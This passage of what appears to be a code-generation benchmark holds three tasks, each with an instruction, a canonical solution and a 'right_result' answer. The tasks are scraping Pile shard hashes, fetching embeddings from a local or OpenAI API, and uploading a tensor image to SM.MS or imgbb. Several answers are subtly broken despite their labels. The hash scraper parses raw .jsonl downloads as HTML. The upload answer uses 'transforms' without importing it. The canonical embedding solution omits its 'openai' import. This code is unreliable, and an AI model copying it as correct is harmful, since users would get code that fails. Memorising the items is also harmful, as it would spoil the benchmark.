    "right_result": "import requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_shard_hashes():\n    urls = [\n        \"https://huggingface.co/datasets/monology/pile-uncopyrighted/resolve/main/data/train/00.jsonl\",\n        \"https://huggingface.co/datasets/monology/pile-uncopyrighted/resolve/main/data/train/01.jsonl\",\n        \"https://huggingface.co/datasets/monology/pile-uncopyrighted/resolve/main/data/train/02.jsonl\"\n    ]\n    output_file = \"shard_hashes.txt\"\n    hashes = []\n\n    for i, url in enumerate(urls):\n        try:\n            response = requests.get(url)\n            if response.status_code == 200:\n                soup = BeautifulSoup(response.text, 'html.parser')\n                hash_div = soup.find('div', class_='Hash')\n                if hash_div and hash_div.has_attr('data-hash'):\n                    sha256_hash = hash_div['data-hash']\n                    hashes.append((url.split('/')[-1], sha256_hash))\n                else:\n                    print(f\"SHA256 hash not found on page {i+1}\")\n            else:\n                print(f\"Failed to retrieve page {i+1}, status code: {response.status_code}\")\n        except Exception as e:\n            print(f\"Error fetching page {i+1}: {e}\")\n\n    with open(output_file, 'w') as f:\n        for filename, hash_value in hashes:\n            f.write(f\"[{filename}] [SHA256 hash] {hash_value}\\n\")\n\n    for i, (_, hash_value) in enumerate(hashes):\n        print(f\"SHA256 hash {i+1}: {hash_value}\")\n\nscrape_shard_hashes()"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API, depending on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding (vector representation) for a given word using either a local HTTP API or OpenAI's API. It handles both types of API calls, processes the response, and returns the embedding as a NumPy array. If the request fails, it prints an error message and returns None.\n\nInput:  \n- `word` (str): The word or text to generate an embedding for.  \n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.5\".  \n\nOutput:  \n- `numpy.ndarray` or `None`: Returns the word embedding as a NumPy array if successful; otherwise, returns None.  \n\nNote: The function assumes the local API endpoint is running at `http://localhost:8000/v1/embeddings` and expects a JSON payload with `model` and `input` fields. For OpenAI's API, it assumes the `openai` library is properly configured.",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import numpy as np\nimport requests\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    local_api_url = \"http://localhost:8000/v1/embeddings\"\n    \n    # Try using the local API first\n    try:\n        response = requests.post(\n            local_api_url,\n            json={\"model\": model, \"input\": word}\n        )\n        if response.status_code == 200:\n            data = response.json()\n            return np.array(data['data'][0]['embedding'])\n        else:\n            print(f\"Local API request failed with status code {response.status_code}: {response.text}\")\n    except Exception as e:\n        print(f\"Error connecting to local API: {e}\")\n\n    # If local API fails, fall back to OpenAI API\n    try:\n        response = openai.Embedding.create(model=model, input=word)\n        return np.array(response['data'][0]['embedding'])\n    except Exception as e:\n        print(f\"Error using OpenAI API: {e}\")\n        return None"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a function to convert a PyTorch tensor to a base64-encoded PNG image and upload it to a specified image hosting service (either SM.MS or imgbb.com) using their respective APIs, returning the hosted image URL.\n\nFunction Description: The function should accept a PyTorch tensor and an API key, convert the tensor to a PNG image, encode it in base64, and upload it to the specified image hosting service. It should handle different response formats from the services and return the hosted image URL or an error message.\n\nInput:\n- image_tensor: torch.Tensor - A PyTorch tensor representing the image to be uploaded\n- api_key: str - The API key for authenticating with the image hosting service\n- service: str (optional) - The image hosting service to use ('smms' or 'imgbb'). Defaults to 'smms'\n\nOutput:\n- str - The URL of the uploaded image on success, or an error message string on failure\n- None - Returned when the input is not a PyTorch tensor or when the upload fails without an error message",
    "Canonical_solution": "import base64\nimport requests\nfrom io import BytesIO\nfrom PIL import Image\nimport numpy as np\nimport torch\n\ndef tensor_to_url_sm(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3SM.MS\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n    \n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: SM.MS API\u5bc6\u94a5\u3002\n    \n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n\n    files = {'smfile': ('image.png', base64.b64decode(img_str), 'image/png')}\n    headers = {'Authorization': api_key}\n\n    try:\n        response = requests.post('https://sm.ms/api/v2/upload', files=files, headers=headers)\n        response.raise_for_status()\n        \n        result = response.json()\n        if result['success']:\n            return result['data']['url']\n        elif result.get('code') == 'image_repeated':\n            return result['images']\n        else:\n            print(f\"Error: {result.get('message')}\")\n            return None\n    except requests.exceptions.RequestException as e:\n        print(f\"HTTP Request Error: {e}\")\n        return None\n\ndef tensor_to_url_imgbb(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3imgbb.com\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n\n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: imgbb.com API\u5bc6\u94a5\u3002\n\n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n    url = \"https://api.imgbb.com/1/upload\"\n    payload = {\"key\": api_key, \"image\": img_str}\n    response = requests.post(url, data=payload)\n    if response.status_code == 200:\n        result = response.json()\n        img_url = result[\"data\"][\"url\"]\n        return img_url\n    else:\n        return \"Error: \" + response.text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import torch\nimport base64\nimport io\nfrom PIL import Image\nimport requests\n\ndef upload_image_tensor(image_tensor, api_key, service='smms'):\n    if not isinstance(image_tensor, torch.Tensor):\n        return None\n\n    try:\n        image_tensor = image_tensor.cpu().detach()\n        if image_tensor.dim() == 3 and image_tensor.shape[0] in [1, 3]:\n            image = transforms.ToPILImage()(image_tensor)\n        elif image_tensor.dim() == 4 and image_tensor.shape[1] in [1, 3]:\n            image = transforms.ToPILImage()(image_tensor[0])\n        else:\n            return None\n    except:\n        return None\n\n    buffered = io.BytesIO()\n    image.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode()\n\n    if service.lower() == 'smms':\n        url = 'https://sm.ms/api/3/upload'\n        headers = {'Authorization': api_key}\n        data = {'base64': img_str, 'format': 'png'}\n        response = requests.post(url, headers=headers, data=data)\n        if response.status_code == 200 and response.json()['success']:\n            return response.json()['data']['url']\n        else:\n            return response.json().get('message', 'Upload failed') if response.content else None\n\n    elif service.lower() == 'imgbb':\n        url = 'https://api.imgbb.com/1/upload'\n        data = {\n            'key': api_key,\n            'image': img_str,\n            'format': 'json'\n        }\n        response = requests.post(url, data=data)\n        if response.status_code == 200:\n            return response.json()['data']['url']\n        else:\n            return response.json().get('error', {}).get('message', 'Upload failed') if response.content else None\n\n    else:\n        return \"Invalid service specified. Use 'smms' or 'imgbb'.\""
  }
]